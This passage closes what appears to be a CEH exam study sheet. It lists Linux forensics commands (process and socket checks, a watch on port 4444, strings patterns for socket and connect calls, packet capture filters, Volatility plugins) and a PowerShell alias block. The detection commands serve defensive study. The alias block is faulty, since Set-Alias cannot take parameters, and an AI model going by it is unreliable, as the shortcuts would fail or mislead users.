Get-AuthenticodeSignature file.exe
```

### Linux Commands
```bash
# Process Monitoring
ps auxww | grep -i suspicious
lsof -i :4444
netstat -anop | grep ESTABLISHED

# File Analysis
file suspicious
strings suspicious | grep -i "socket\|connect"
md5sum suspicious && sha256sum suspicious

# Network Analysis
tcpdump -i eth0 -w capture.pcap tcp port 4444
tshark -r capture.pcap -Y "tcp.dstport==4444" -T fields -e ip.src -e ip.dst

# Memory Dump
volatility -f memory.img windows.pslist
volatility -f memory.img windows.netscan
```

### Useful Aliases for Exam
```powershell
# Add to PowerShell profile
Set-Alias proc Get-Process
Set-Alias net netstat
Set-Alias reg reg.exe
Set-Alias ps "Get-Process"
Set-Alias ls "Get-ChildItem -Force"
Set-Alias cat "Get-Content"
```

---

**Last Updated:** June 2026  
**Next Review:** December 2026  
**Exam Version:** CEH v13  
**Author:** Security Research Team  

For updates and corrections, submit pull requests to the GitHub repository.
